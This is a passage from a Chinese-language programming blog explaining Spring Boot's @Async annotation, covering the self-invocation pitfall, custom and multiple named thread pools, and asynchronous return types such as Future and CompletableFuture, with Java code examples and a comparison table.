<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyService</span> &#123;</span><br><span class="line">    <span class="meta">@Async</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">asyncMethod</span><span class="params">()</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">syncMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 这样调用是错误的！异步不会生效！</span></span><br><span class="line">        <span class="built_in">this</span>.asyncMethod(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>原因</strong>：<code>syncMethod</code> 通过 <code>this</code> 关键字调用 <code>asyncMethod</code>，这是直接的对象内部调用，绕过了 Spring 创建的代理对象，因此 AOP 切面无法拦截，异步逻辑也就无法触发。</p>
</li>
<li><p><strong>解决方案</strong>：将 <code>@Async</code> 方法移到另一个独立的 Bean 中，然后通过注入的方式来调用它。</p>
</li>
</ul>
</li>
<li><p><strong>默认线程池</strong>：Spring Boot 会自动配置一个 <code>ThreadPoolTaskExecutor</code> 作为默认的异步线程池。如果需要更精细的控制（如核心线程数、队列容量、拒绝策略等），建议自定义线程池。我们将在下一节详细讨论。</p>
</li>
</ol>
<hr>
<h3 id="4-2-自定义线程池"><a href="#4-2-自定义线程池" class="headerlink" title="4.2 自定义线程池"></a>4.2 自定义线程池</h3><h4 id="4-2-1-为什么需要自定义线程池？"><a href="#4-2-1-为什么需要自定义线程池？" class="headerlink" title="4.2.1 为什么需要自定义线程池？"></a>4.2.1 为什么需要自定义线程池？</h4><p>Spring Boot 会为 <code>@Async</code>  提供一个默认的线程池（<code>ThreadPoolTaskExecutor</code>）。虽然开箱即用很方便，但在生产环境中，依赖默认配置通常是不够的，原因如下：</p>
<ol>
<li><strong>资源隔离与控制</strong>：默认情况下，所有 <code>@Async</code> 任务共享同一个线程池。如果一种类型的异步任务（如文件处理）执行得非常慢且数量巨大，它可能会占满所有线程，导致其他更重要的异步任务（如发送验证码）被阻塞或延迟执行。通过为不同类型的业务创建不同的线程池，可以实现资源隔离。</li>
<li><strong>精细化配置</strong>：默认线程池的参数（如核心线程数、最大线程数、队列容量）可能不适合你的应用负载。例如，对于 I&#x2F;O 密集型任务，你可能需要更多的线程；对于 CPU 密集型任务，线程数通常设置为 CPU 核心数左右。自定义线程池允许你根据业务特性进行精细化配置。</li>
<li><strong>命名与监控</strong>：为线程池指定一个有意义的名称（如 <code>email-task-executor</code>），可以在日志和监控工具（如 JMX, Prometheus）中清晰地识别出是哪个线程池在执行任务，便于问题排查和性能分析。</li>
<li><strong>拒绝策略</strong>：当线程池和任务队列都满了之后，新提交的任务该如何处理？默认的拒绝策略可能会抛出异常。你可以自定义拒绝策略，例如记录日志后丢弃、由调用者线程自己执行等。</li>
</ol>
<hr>
<h4 id="4-2-2-实现方式"><a href="#4-2-2-实现方式" class="headerlink" title="4.2.2 实现方式"></a>4.2.2 实现方式</h4><p>在 Spring 中自定义线程池主要有两种方式：</p>
<ol>
<li><strong>重写默认线程池</strong>：通过定义一个特定类型的 Bean 来覆盖 Spring Boot 的默认配置。</li>
<li><strong>创建多个线程池</strong>：定义多个 <code>TaskExecutor</code> Bean，并在 <code>@Async</code> 注解中指定使用哪一个。</li>
</ol>
<h5 id="1-重写默认的异步线程池"><a href="#1-重写默认的异步线程池" class="headerlink" title="1. 重写默认的异步线程池"></a>1. 重写默认的异步线程池</h5><p>如果你希望整个应用的所有 <code>@Async</code> 调用都使用统一的、自定义配置的线程池，可以创建一个 <code>TaskExecutor</code> 类型的 Bean。Spring Boot 在自动配置时，如果发现容器中已经存在一个 <code>TaskExecutor</code> Bean，就会使用它，而不再创建默认的。</p>
<p><strong>实现步骤：</strong></p>
<p>在一个配置类（<code>@Configuration</code>）中定义一个 <code>Bean</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsyncConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean(&quot;taskExecutor&quot;)</span> <span class="comment">// Bean 的名称可以自定义，Spring 会优先寻找名为 &quot;taskExecutor&quot; 的 Bean</span></span><br><span class="line">    <span class="keyword">public</span> Executor <span class="title function_">taskExecutor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ThreadPoolTaskExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolTaskExecutor</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 核心线程数：线程池创建时初始化的线程数</span></span><br><span class="line">        executor.setCorePoolSize(<span class="number">10</span>); </span><br><span class="line">        <span class="comment">// 最大线程数：线程池最大的线程数，只有在缓冲队列满了之后才会申请超过核心线程数的线程</span></span><br><span class="line">        executor.setMaxPoolSize(<span class="number">20</span>); </span><br><span class="line">        <span class="comment">// 缓冲队列：用来缓冲执行任务的队列</span></span><br><span class="line">        executor.setQueueCapacity(<span class="number">200</span>);</span><br><span class="line">        <span class="comment">// 允许线程的空闲时间 (当超过核心线程数时，多余的线程会被销毁)</span></span><br><span class="line">        executor.setKeepAliveSeconds(<span class="number">60</span>);</span><br><span class="line">        <span class="comment">// 线程池名的前缀：设置好了之后可以方便我们定位处理任务所在的线程池</span></span><br><span class="line">        executor.setThreadNamePrefix(<span class="string">&quot;default-async-&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 拒绝策略：当线程池和队列都满了，表明达到了最大处理能力，该如何处理新来的任务</span></span><br><span class="line">        <span class="comment">// AbortPolicy: 直接抛出 RejectedExecutionException 异常 (默认)</span></span><br><span class="line">        <span class="comment">// CallerRunsPolicy: 由调用者线程处理该任务</span></span><br><span class="line">        <span class="comment">// DiscardPolicy: 丢弃最新的任务，不处理</span></span><br><span class="line">        <span class="comment">// DiscardOldestPolicy: 丢弃队列最前面的任务，然后重新尝试执行当前任务</span></span><br><span class="line">        <span class="comment">// executor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy());</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 等待所有任务结束后再关闭线程池</span></span><br><span class="line">        executor.setWaitForTasksToCompleteOnShutdown(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        executor.initialize();</span><br><span class="line">        <span class="keyword">return</span> executor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>说明</strong>：完成以上配置后，所有未指定线程池的 <code>@Async</code> 方法都会自动使用这个名为 <code>taskExecutor</code> 的线程池。</p>
</blockquote>
<hr>
<h5 id="2-创建并使用多个线程池"><a href="#2-创建并使用多个线程池" class="headerlink" title="2. 创建并使用多个线程池"></a>2. 创建并使用多个线程池</h5><p>这是一种更灵活、更推荐的方式，尤其是在复杂的应用中。你可以为不同业务场景创建专用的线程池。</p>
<p><strong>实现步骤：</strong></p>
<p><strong>在配置类中定义多个 <code>Executor</code> Bean，并为它们指定唯一的名称。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MultipleAsyncConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 线程池一：用于处理邮件发送任务</span></span><br><span class="line">    <span class="meta">@Bean(&quot;emailTaskExecutor&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Executor <span class="title function_">emailTaskExecutor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ThreadPoolTaskExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolTaskExecutor</span>();</span><br><span class="line">        executor.setCorePoolSize(<span class="number">5</span>);</span><br><span class="line">        executor.setMaxPoolSize(<span class="number">10</span>);</span><br><span class="line">        executor.setQueueCapacity(<span class="number">50</span>);</span><br><span class="line">        executor.setThreadNamePrefix(<span class="string">&quot;email-async-&quot;</span>);</span><br><span class="line">        <span class="comment">// 拒绝策略：由调用者线程执行，确保邮件不会轻易丢失</span></span><br><span class="line">        executor.setRejectedExecutionHandler(<span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());</span><br><span class="line">        executor.initialize();</span><br><span class="line">        <span class="keyword">return</span> executor;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 线程池二：用于处理数据分析任务 (CPU 密集型)</span></span><br><span class="line">    <span class="meta">@Bean(&quot;dataAnalysisTaskExecutor&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Executor <span class="title function_">dataAnalysisTaskExecutor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ThreadPoolTaskExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolTaskExecutor</span>();</span><br><span class="line">        <span class="comment">// CPU 密集型任务，线程数不宜过多</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">coreCount</span> <span class="operator">=</span> Runtime.getRuntime().availableProcessors();</span><br><span class="line">        executor.setCorePoolSize(coreCount);</span><br><span class="line">        executor.setMaxPoolSize(coreCount * <span class="number">2</span>);</span><br><span class="line">        executor.setQueueCapacity(<span class="number">100</span>);</span><br><span class="line">        executor.setThreadNamePrefix(<span class="string">&quot;data-analysis-async-&quot;</span>);</span><br><span class="line">        executor.initialize();</span><br><span class="line">        <span class="keyword">return</span> executor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>在使用 <code>@Async</code> 注解时，通过其 <code>value</code> 属性指定要使用的线程池 Bean 的名称。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmailService</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 指定使用名为 &quot;emailTaskExecutor&quot; 的线程池</span></span><br><span class="line">    <span class="meta">@Async(&quot;emailTaskExecutor&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendEmail</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;发送邮件... 当前线程: &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        <span class="comment">// ... 邮件发送逻辑 ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataAnalysisService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定使用名为 &quot;dataAnalysisTaskExecutor&quot; 的线程池</span></span><br><span class="line">    <span class="meta">@Async(&quot;dataAnalysisTaskExecutor&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">analyzeData</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;分析数据... 当前线程: &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        <span class="comment">// ... 复杂的数据计算逻辑 ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong>：如果 <code>@Async</code> 注解没有指定 <code>value</code>，它会去寻找名为 <code>taskExecutor</code> 的 Bean，或者 Spring Boot 的默认线程池。</p>
</blockquote>
<hr>
<h4 id="4-2-3-总结"><a href="#4-2-3-总结" class="headerlink" title="4.2.3 总结"></a>4.2.3 总结</h4><ul>
<li><strong>默认配置用于开发</strong>：Spring Boot 的默认异步线程池适合快速开发和简单场景。</li>
<li><strong>自定义用于生产</strong>：在生产环境中，<strong>强烈建议</strong>根据业务需求自定义一个或多个线程池。</li>
<li><strong>资源隔离是关键</strong>：为不同类型的异步任务（特别是重要程度、耗时特性不同的任务）分配独立的线程池，是保证系统稳定性的重要手段。</li>
<li><strong>合理配置参数</strong>：线程池的核心参数（<code>corePoolSize</code>, <code>maxPoolSize</code>, <code>queueCapacity</code>）需要根据任务是 <strong>CPU 密集型</strong>还是 <strong>I&#x2F;O 密集型</strong>，以及系统的负载情况来综合评估和调整。</li>
</ul>
<hr>
<h3 id="4-3-异步返回值"><a href="#4-3-异步返回值" class="headerlink" title="4.3 异步返回值"></a>4.3 异步返回值</h3><p>当一个 <code>@Async</code> 方法的返回类型是 <code>void</code> 时，它是一个“即发即忘”(fire-and-forget)的任务。调用者无法得知任务何时完成，也无法获取其执行结果或捕获其内部抛出的异常。</p>
<p>为了解决这个问题，Spring 的 <code>@Async</code> 方法支持返回特定的类型，这些类型充当了未来某个时间点才会产生的“结果占位符”。</p>
<p>主流的异步返回值类型有三种：<code>Future</code>、<code>CompletableFuture</code> 和 Spring 自带的 <code>ListenableFuture</code>。</p>
<hr>
<h4 id="4-3-1-Future：经典的异步结果句柄"><a href="#4-3-1-Future：经典的异步结果句柄" class="headerlink" title="4.3.1 Future&lt;T&gt;：经典的异步结果句柄"></a>4.3.1 <code>Future&lt;T&gt;</code>：经典的异步结果句柄</h4><p><code>java.util.concurrent.Future</code> 是 Java 5 引入的标准接口，代表一个异步计算的结果。</p>
<p><strong>工作方式：</strong></p>
<p>当调用返回 <code>Future&lt;T&gt;</code> 的 <code>@Async</code> 方法时，调用会立即返回一个 <code>Future</code> 对象。这个对象是一个“句柄”，你可以通过它来检查任务是否完成、取消任务，或者<strong>阻塞等待</strong>并获取最终的结果。</p>
<p><strong>实现示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.Async;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.AsyncResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Future;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FutureTaskService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Async</span></span><br><span class="line">    <span class="keyword">public</span> Future&lt;String&gt; <span class="title function_">findUser</span><span class="params">(String username)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;开始查找用户: &quot;</span> + username + <span class="string">&quot; on thread: &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>); <span class="comment">// 模拟耗时操作</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;用户信息: &quot;</span> + username;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 使用 Spring 提供的 AsyncResult 来包装结果</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AsyncResult</span>&lt;&gt;(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>调用方如何使用：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.Future;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">callFutureTask</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;主线程发起异步调用...&quot;</span>);</span><br><span class="line">    Future&lt;String&gt; futureResult = futureTaskService.findUser(<span class="string">&quot;JohnDoe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!futureResult.isDone()) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;主线程正在做其他事情，同时检查异步任务是否完成...&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// isDone() 返回 true 后，调用 get() 不会阻塞或只会短暂阻塞</span></span><br><span class="line">    <span class="comment">// 如果在 isDone() 为 false 时调用 get()，主线程会一直阻塞直到任务完成</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> futureResult.get(); </span><br><span class="line">    System.out.println(<span class="string">&quot;获取到异步结果: &quot;</span> + result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>Future</code> 的局限性：</strong></p>
<ul>
<li><strong>阻塞式获取结果</strong>：<code>future.get()</code> 是一个阻塞操作。虽然任务是异步执行的，但为了获取结果，主线程最终还是得停下来等待。</li>
<li><strong>无法链式操作</strong>：你不能方便地指定“当任务A完成后，用它的结果去执行任务B”。这种编排逻辑写起来非常笨拙。</li>
<li><strong>无回调机制</strong>：<code>Future</code> 没有提供一个“任务完成后请通知我”的回调机制，你只能通过 <code>isDone()</code> 去轮询，效率低下。</li>
</ul>
<hr>
<h4 id="4-3-2-CompletableFuture：推荐的现代异步编程方式"><a href="#4-3-2-CompletableFuture：推荐的现代异步编程方式" class="headerlink" title="4.3.2 CompletableFuture&lt;T&gt;：推荐的现代异步编程方式"></a>4.3.2 <code>CompletableFuture&lt;T&gt;</code>：推荐的现代异步编程方式</h4><p><code>java.util.concurrent.CompletableFuture</code> 是 Java 8 引入的，它不仅实现了 <code>Future</code> 接口，还实现了 <code>CompletionStage</code> 接口，提供了极其强大的函数式、非阻塞的异步编程能力。<strong>它是目前处理异步返回值的最佳选择。</strong></p>
<p><strong>工作方式：</strong></p>
<p>它支持<strong>回调</strong>和<strong>链式调用</strong>。你可以定义一系列操作，当异步任务完成时，这些操作会自动被触发，整个过程可以做到非阻塞。</p>
<p><strong>实现示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.Async;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CompletableFuture;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompletableFutureTaskService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Async(&quot;taskExecutor&quot;)</span> <span class="comment">// 推荐指定一个线程池</span></span><br><span class="line">    <span class="keyword">public</span> CompletableFuture&lt;String&gt; <span class="title function_">processData</span><span class="params">(String data)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;开始处理数据: &quot;</span> + data + <span class="string">&quot; on thread: &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        Thread.sleep(<span class="number">4000</span>); <span class="comment">// 模拟耗时操作</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;error&quot;</span>.equals(data)) &#123;</span><br><span class="line">            <span class="comment">// 模拟异常情况</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid data provided&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;处理结果: &quot;</span> + data.toUpperCase();</span><br><span class="line">        <span class="comment">// 使用工厂方法返回一个已完成的 CompletableFuture</span></span><br><span class="line">        <span class="keyword">return</span> CompletableFuture.completedFuture(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong>：如果 <code>@Async</code> 方法内部抛出异常，Spring 会自动捕获它，并返回一个“异常完成”的 <code>CompletableFuture</code>。</p>
</blockquote>
<p><strong>调用方如何使用（展示其强大之处）：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">callCompletableFutureTask</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;主线程发起异步调用...&quot;</span>);</span><br><span class="line">    CompletableFuture&lt;String&gt; future = completableFutureTaskService.processData(<span class="string">&quot;my-data&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 链式调用：非阻塞地定义后续操作</span></span><br><span class="line">    future.thenApply(result -&gt; &#123;</span><br><span class="line">        <span class="comment">// 当 future 完成时，这个转换操作会被执行</span></span><br><span class="line">        System.out.println(<span class="string">&quot;第一步转换 on thread: &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Transformed -&gt; &quot;</span> + result;</span><br><span class="line">    &#125;).thenAccept(finalResult -&gt; &#123;</span><br><span class="line">        <span class="comment">// 当上一步转换完成后，这个消费操作会被执行</span></span><br><span class="line">        System.out.println(<span class="string">&quot;最终结果消费: &quot;</span> + finalResult + <span class="string">&quot; on thread: &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">    &#125;).exceptionally(ex -&gt; &#123;</span><br><span class="line">        <span class="comment">// 如果在任何一步出现异常，这个处理器会被调用</span></span><br><span class="line">        System.err.println(<span class="string">&quot;发生异常: &quot;</span> + ex.getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 返回一个默认值或 null</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;主线程已设置好回调，继续执行自己的任务，完全不阻塞。&quot;</span>);</span><br><span class="line">    <span class="comment">// 主线程可以继续做其他事情，例如等待其他任务或直接结束</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong><code>CompletableFuture</code> 的核心优势</strong>：</p>
<ul>
<li><strong>非阻塞回调</strong>：通过 <code>thenApply</code>, <code>thenAccept</code>, <code>thenRun</code> 等方法，可以定义任务完成后自动执行的逻辑。</li>
<li><strong>强大的组合能力</strong>：可以通过 <code>thenCombine</code>（组合两个异步结果）、<code>allOf</code>（等待所有任务完成）、<code>anyOf</code>（等待任一任务完成）等方法编排复杂的异步工作流。</li>
<li><strong>优雅的异常处理</strong>：通过 <code>exceptionally</code> 和 <code>handle</code> 方法，可以集中处理异步链中的异常，代码更清晰。</li>
</ul>
</blockquote>
<hr>
<h4 id="4-3-3-ListenableFuture-已过时"><a href="#4-3-3-ListenableFuture-已过时" class="headerlink" title="4.3.3 ListenableFuture&lt;T&gt; (已过时)"></a>4.3.3 <code>ListenableFuture&lt;T&gt;</code> (已过时)</h4><p>这是 Spring 框架自己提供的一个接口，在 Java 8 的 <code>CompletableFuture</code> 出现之前，它用来弥补 <code>Future</code> 缺少回调机制的不足。</p>
<p>它的工作方式是通过 <code>addCallback</code> 方法注册成功和失败的回调。</p>
<p>由于 <code>CompletableFuture</code> 的功能更全面且已成为 Java 标准，<strong><code>ListenableFuture</code> 现在已经不推荐在新项目中使用。</strong> 了解即可。</p>
<hr>
<h4 id="4-3-4-总结对比"><a href="#4-3-4-总结对比" class="headerlink" title="4.3.4 总结对比"></a>4.3.4 总结对比</h4><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left"><code>Future&lt;T&gt;</code></th>
<th align="left"><code>CompletableFuture&lt;T&gt;</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>获取结果</strong></td>
<td align="left"><strong>阻塞式</strong> (<code>get()</code> 方法)</td>
<td align="left"><strong>非阻塞</strong> (通过回调) 或 阻塞 (<code>get()</code>)</td>
</tr>
<tr>
<td align="left"><strong>编排能力</strong></td>
<td align="left"><strong>弱</strong>，难以组合多个异步任务</td>
<td align="left"><strong>强</strong>，支持链式调用 (<code>thenApply</code>) 和组合 (<code>thenCombine</code>)</td>
</tr>
<tr>
<td align="left"><strong>异常处理</strong></td>
<td align="left">笨拙 (通过 <code>try-catch ExecutionException</code>)</td>
<td align="left"><strong>优雅</strong> (通过 <code>exceptionally</code>, <code>handle</code> 回调)</td>
</tr>
<tr>
<td align="left"><strong>回调支持</strong></td>
<td align="left">不支持</td>
<td align="left"><strong>核心特性</strong></td>
</tr>
<tr>
<td align="left"><strong>Java 版本</strong></td>
<td align="left">Java 5+</td>
<td align="left">Java 8+</td>
</tr>
<tr>
<td align="left"><strong>推荐度</strong></td>
<td align="left">不推荐用于复杂场景</td>
<td align="left"><strong>强烈推荐</strong></td>
</tr>
</tbody></table>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/09/Web%E5%8D%8F%E8%AE%AE%E6%9C%8D%E5%8A%A1%E5%99%A8/JavaServlet/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冉丝堂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="冉的技术宝典">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | 冉的技术宝典">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
